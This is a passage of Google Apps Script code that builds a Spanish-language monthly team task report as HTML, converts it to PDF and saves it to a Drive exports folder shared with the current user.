    + '<div class="lede">Actividad del equipo de ' + _pdfEsc(countryName) + ' durante ' + _pdfEsc(monthLabel) + '.</div>'
    + '<div class="kpis">'
    +   statCard('Abiertas', openedInMonth.length, 'tareas creadas en el mes')
    +   statCard('Cerradas', closedInMonth.length, 'tareas cerradas en el mes')
    +   statCard('Vencidas al cierre', overdueAtEOM.length, 'abiertas pasado el plazo')
    +   statCard('% en tiempo', onTimePct == null ? '—' : (onTimePct + '%'), onTimePct == null ? 'sin cierres' : 'dentro de SLA')
    + '</div>'
    + '<h2>Tareas cerradas en el mes</h2>'
    + '<table class="data">'
    +   '<thead><tr><th>ID</th><th>Tarea</th><th>Responsable</th><th>Cerrada</th><th>Resultado SLA</th></tr></thead>'
    +   '<tbody>' + rowsClosed(closedInMonth) + '</tbody>'
    + '</table>'
    + '<h2>Aún abiertas al cierre del mes</h2>'
    + '<table class="data">'
    +   '<thead><tr><th>ID</th><th>Tarea</th><th>Responsable</th><th>Prioridad</th><th>Plazo</th></tr></thead>'
    +   '<tbody>' + rowsOpen(stillOpenAtEOM) + '</tbody>'
    + '</table>'
    + '<div class="two-col">'
    +   '<div>'
    +     '<h2>Top responsables</h2>'
    +     '<table class="data"><tbody>' + rowsTop(topMembers, 'member') + '</tbody></table>'
    +   '</div>'
    +   '<div>'
    +     '<h2>Top proyectos</h2>'
    +     '<table class="data"><tbody>' + rowsTop(topProjects, 'project') + '</tbody></table>'
    +   '</div>'
    + '</div>'
    + '<div class="footer">Generado el ' + _pdfEsc(generatedAt) + ' · Confidencial — uso interno únicamente.</div>'
    + '</body></html>';

  var pdfBlob = HtmlService.createHtmlOutput(html).getAs('application/pdf');
  var fileName = 'LT_' + countryCode + '_' + monthISO + '.pdf';
  pdfBlob.setName(fileName);
  var folder = _getOrCreateExportsFolder();
  var file = folder.createFile(pdfBlob);
  try {
    var email = '';
    try { email = Session.getActiveUser().getEmail() || ''; } catch (e) {}
    if (email) file.addEditor(email);
  } catch (e) {}

  return {
    success: true,
    url: file.getUrl(),
    fileName: fileName
  };
}

